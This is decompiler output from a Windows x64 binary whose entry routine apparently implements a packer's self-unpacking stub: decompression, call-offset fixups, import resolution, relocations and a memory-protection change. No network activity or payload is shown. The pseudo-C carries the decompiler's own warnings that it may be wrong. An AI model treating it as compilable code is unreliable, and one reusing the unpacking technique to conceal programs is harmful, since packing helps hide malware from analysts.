// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1B7BE8: using guessed type __int64 qword_13F1B7BE8;

//----- (000000013F17F970) ----------------------------------------------------
__int64 sub_13F17F970()
{
  return sub_13F1782B0();
}
// 13F17F970: using guessed type __int64 __fastcall sub_13F17F970();

//----- (000000013F1D8600) ----------------------------------------------------
__int64 __fastcall start(__int64 a1, __int64 a2)
{
  LODWORD(off_13F187000[32158]) = 1253037728;
  return sub_13F1D8680(0i64, a2);
}
// 13F1D8622: ignored the value written to the shadow area of the succeeding call
// 13F1D8621: ignored the value written to the shadow area of the succeeding call
// 13F1D8619: ignored the value written to the shadow area of the succeeding call
// 13F187000: using guessed type __int64 (__fastcall *off_13F187000[3])();

//----- (000000013F1D8642) ----------------------------------------------------
int *__fastcall sub_13F1D8642(unsigned int a1)
{
  unsigned __int64 v1; // rbp
  _DWORD *v2; // rdi
  int *result; // rax
  char v4; // dl
  unsigned int v5; // ecx
  int v6; // edx
  bool v7; // cf
  bool v8; // zf

  result = (_DWORD *)((char *)v2 + v1);
  v4 = *((_BYTE *)v2 + v1);
  if ( a1 <= 5 )
    goto LABEL_9;
  if ( v1 > 0xFFFFFFFFFFFFFFFCui64 )
    goto LABEL_9;
  v5 = a1 - 4;
  do
  {
    v6 = *result++;
    v7 = v5 < 4;
    v5 -= 4;
    *v2++ = v6;
  }
  while ( !v7 );
  v8 = v5 == -4;
  a1 = v5 + 4;
  v4 = *(_BYTE *)result;
  if ( !v8 )
  {
LABEL_9:
    do
    {
      result = (int *)((char *)result + 1);
      *(_BYTE *)v2 = v4;
      --a1;
      v4 = *(_BYTE *)result;
      v2 = (_DWORD *)((char *)v2 + 1);
    }
    while ( a1 );
  }
  return result;
}
// 13F1D8642: variable 'v2' is possibly undefined
// 13F1D8642: variable 'v1' is possibly undefined

//----- (000000013F1D8680) ----------------------------------------------------
// positive sp value has been detected, the output may be wrong!
__int64 __fastcall sub_13F1D8680(__int64 a1, __int64 a2)
{
  unsigned __int64 v2; // rbx
  unsigned __int64 v3; // rbp
  _BYTE *v4; // rdi
  _BYTE *v5; // rsi
  __int64 (__fastcall *v6)(__int64, __int64); // r11
  bool v7; // cf
  int v8; // ebx
  int v9; // ett
  int v10; // eax
  __int64 v11; // rdx
  int v12; // ecx
  void (*v13)(void); // r11
  unsigned int v14; // eax
  bool v15; // cf
  int v16; // ebx
  int v17; // ett
  unsigned int v18; // eax
  __int64 v19; // rdx
  int v20; // eax
  bool v21; // cf
  int v22; // ebx
  int v23; // ett
  __int64 v24; // rcx
  bool v25; // cf
  int v26; // ebx
  int v27; // ett
  int v28; // ecx
  bool v29; // cf
  int v30; // ebx
  int v31; // ett
  int v32; // ecx
  int v33; // ecx
  unsigned int *v34; // rsi
  unsigned int *v35; // rcx
  int v36; // ebx
  unsigned __int8 v37; // al
  unsigned int *v38; // rsi
  unsigned int v39; // eax
  unsigned int *v40; // rsi
  char *v41; // rdi
  __int64 v42; // rax
  __int64 *v43; // rbx
  __int64 v44; // rbp
  char v45; // al
  char *v46; // rcx
  char *v47; // rdx
  unsigned __int8 v48; // al
  bool v49; // zf
  __int64 v50; // rax
  _WORD *v52; // rdi
  unsigned __int64 *i; // rbx
  __int64 v54; // rax
  void (__fastcall *v55)(unsigned int *, __int64, unsigned int *); // rbp
  unsigned int *v56; // rdi
  __int64 (__fastcall *v57)(__int64, __int64); // [rsp-78h] [rbp-B8h]
  unsigned int *v58; // [rsp-70h] [rbp-B0h]
  _DWORD *v59; // [rsp-68h] [rbp-A8h]
  unsigned int *v60; // [rsp-60h] [rbp-A0h] BYREF
  __int64 v61; // [rsp-40h] [rbp-80h] BYREF
  __int64 v62; // [rsp-38h] [rbp-78h] BYREF

  v6 = v57;
  while ( 1 )
  {
    while ( 1 )
    {
      LOBYTE(a2) = *v5;
      v7 = __CFADD__((_DWORD)v2, (_DWORD)v2);
      LODWORD(v2) = 2 * v2;
      if ( !(_DWORD)v2 )
      {
        v8 = *(_DWORD *)v5;
        v7 = (unsigned __int64)v5 < 0xFFFFFFFFFFFFFFFCui64;
        v5 += 4;
        v9 = v7 + v8;
        v7 = __CFADD__(v7, v8) | __CFADD__(v8, v9);
        LODWORD(v2) = v8 + v9;
        LOBYTE(a2) = *v5;
      }
      if ( !v7 )
        break;
      ++v5;
      *v4++ = a2;
    }
    while ( 1 )
    {
      v10 = v6(a1, a2);
      v14 = v10 + v7 + v10;
      v15 = __CFADD__((_DWORD)v2, (_DWORD)v2);
      v2 = (unsigned int)(2 * v2);
      if ( !(_DWORD)v2 )
      {
        v16 = *(_DWORD *)v5;
        v7 = (unsigned __int64)v5 < 0xFFFFFFFFFFFFFFFCui64;
        v5 += 4;
        v17 = v7 + v16;
        v15 = __CFADD__(v7, v16) | __CFADD__(v16, v17);
        v2 = (unsigned int)(v16 + v17);
        LOBYTE(v11) = *v5;
      }
      if ( v15 )
        break;
      v13();
    }
    v7 = v14 < 3;
    v18 = v14 - 3;
    if ( !v7 )
      break;
    v21 = __CFADD__((_DWORD)v2, (_DWORD)v2);
    LODWORD(v2) = 2 * v2;
    if ( !(_DWORD)v2 )
    {
      v22 = *(_DWORD *)v5;
      v7 = (unsigned __int64)v5 < 0xFFFFFFFFFFFFFFFCui64;
      v5 += 4;
      v23 = v7 + v22;
      v21 = __CFADD__(v7, v22) | __CFADD__(v22, v23);
      LODWORD(v2) = v22 + v23;
    }
    if ( v21 )
    {
LABEL_25:
      v13();
      v32 = v33 + v7 + v33;
      goto LABEL_26;
    }
LABEL_18:
    v24 = (unsigned int)(v12 + 1);
    v25 = __CFADD__((_DWORD)v2, (_DWORD)v2);
    LODWORD(v2) = 2 * v2;
    if ( !(_DWORD)v2 )
    {
      v26 = *(_DWORD *)v5;
      v7 = (unsigned __int64)v5 < 0xFFFFFFFFFFFFFFFCui64;
      v5 += 4;
      v27 = v7 + v26;
      v25 = __CFADD__(v7, v26) | __CFADD__(v26, v27);
      LODWORD(v2) = v26 + v27;
    }
    if ( v25 )
      goto LABEL_25;
    do
    {
      ((void (__fastcall *)(__int64))v13)(v24);
      v24 = v28 + (unsigned int)v7 + v28;
      v29 = __CFADD__((_DWORD)v2, (_DWORD)v2);
      LODWORD(v2) = 2 * v2;
      if ( !(_DWORD)v2 )
      {
        v30 = *(_DWORD *)v5;
        v7 = (unsigned __int64)v5 < 0xFFFFFFFFFFFFFFFCui64;
        v5 += 4;
        v31 = v7 + v30;
        v29 = __CFADD__(v7, v30) | __CFADD__(v30, v31);
        LODWORD(v2) = v30 + v31;
      }
    }
    while ( !v29 );
    v32 = v24 + 2;
LABEL_26:
    sub_13F1D8642((v3 < 0xFFFFFFFFFFFFFB00ui64) + v32 + 2);
  }
  v11 = (unsigned __int8)v11;
  ++v5;
  v20 = ~((unsigned __int8)v11 | (v18 << 8));
  if ( v20 )
  {
    v3 = v20 >> 1;
    if ( v20 & 1 )
      goto LABEL_25;
    goto LABEL_18;
  }
  v34 = v58;
  *v59 = (_DWORD)v60;
  v60 = v58;
  LOBYTE(v19) = 21;
  v59 = (_DWORD *)v2;
  v35 = (unsigned int *)((char *)v58 + 518653);
  v36 = (int)v58;
LABEL_37:
  if ( v34 >= v35 )
    goto LABEL_39;
  v37 = *(_BYTE *)v34;
  v38 = (unsigned int *)((char *)v34 + 1);
LABEL_33:
  if ( v37 != 0xE8 && v37 != 0xE9 )
  {
    if ( v38 >= v35 )
      goto LABEL_39;
    v58 = v38;
    goto LABEL_30;
  }
  while ( v38 < v35 )
  {
    v58 = v38;
    v39 = *v38;
    v34 = v38 + 1;
    LOBYTE(v39) = v39 - 21;
    if ( !(_BYTE)v39 )
    {
      *v58 = v36 + _byteswap_ulong(v39) - (_DWORD)v58;
      goto LABEL_37;
    }
LABEL_30:
    v37 = *(_BYTE *)v58;
    v38 = (unsigned int *)((char *)v58 + 1);
    if ( *(_BYTE *)v58 < 0x80u || v37 > 0x8Fu || *((_BYTE *)v58 - 1) != 15 )
      goto LABEL_33;
  }
LABEL_39:
  v40 = v60;
  v41 = (char *)(v60 + 218112);
  while ( 1 )
  {
    v42 = *(unsigned int *)v41;
    if ( !*(_DWORD *)v41 )
      break;
    v43 = (__int64 *)((char *)v40 + *((unsigned int *)v41 + 1));
    v41 += 8;
    v44 = MEMORY[0x13F1D9264]((char *)v40 + v42 + 885212, v19);
    while ( 1 )
    {
      v45 = *v41++;
      if ( !v45 )
        break;
      v46 = v41;
      v47 = v41;
      v48 = v45 - 1;
      do
      {
        if ( !v46 )
          break;
        v49 = *v41++ == (char)v48;
        --v46;
      }
      while ( !v49 );
      v50 = MEMORY[0x13F1D9274](v44, v47);
      if ( !v50 )
        return MEMORY[0x13F1D926C]();
      *v43++ = v50;
    }
  }
  v52 = v41 + 4;
  for ( i = (unsigned __int64 *)(v40 - 1); ; *i = (unsigned __int64)v40 + _byteswap_uint64(*i) )
  {
    LODWORD(v54) = *(unsigned __int8 *)v52;
    v52 = (_WORD *)((char *)v52 + 1);
    v54 = (unsigned int)v54;
    if ( !(_DWORD)v54 )
      break;
    if ( (unsigned __int8)v54 > 0xEFu )
    {
      LOBYTE(v54) = v54 & 0xF;
      v54 = (unsigned int)((_DWORD)v54 << 16);
      LOWORD(v54) = *v52++;
    }
    i = (unsigned __int64 *)((char *)i + v54);
  }
  v55 = (void (__fastcall *)(unsigned int *, __int64, unsigned int *))MEMORY[0x13F1D927C];
  v56 = v40 - 1024;
  v60 = 0i64;
  MEMORY[0x13F1D927C](v40 - 1024, 4096i64, 4i64, &v60);
  *((_BYTE *)v56 + 575) &= ~0x80u;
  *((_BYTE *)v56 + 615) &= ~0x80u;
  v55(v40 - 1024, 4096i64, v60);
  do
    v61 = 0i64;
  while ( &v61 != &v62 - 16 );
  return sub_13F140DBC();
}
// 13F1D887B: positive sp value B8 has been found
// 13F1D8685: variable 'v5' is possibly undefined
// 13F1D8688: variable 'v4' is possibly undefined
// 13F1D868F: variable 'v2' is possibly undefined
// 13F1D86A6: variable 'v13' is possibly undefined
// 13F1D86AB: variable 'v6' is possibly undefined
// 13F1D86AB: variable 'a1' is possibly undefined
// 13F1D86AB: variable 'a2' is possibly undefined
// 13F1D86AE: variable 'v7' is possibly undefined
// 13F1D86C8: variable 'v11' is possibly undefined
// 13F1D86EC: variable 'v12' is possibly undefined
// 13F1D86FF: variable 'v28' is possibly undefined
// 13F1D8717: variable 'v33' is possibly undefined
// 13F1D8719: variable 'v3' is possibly undefined
// 13F1D87AA: variable 'v19' is possibly undefined

// nfuncs=2496 queued=2418 decompiled=2418 lumina nreq=0 worse=0 better=0
// ALL OK, 2418 function(s) have been successfully decompiled
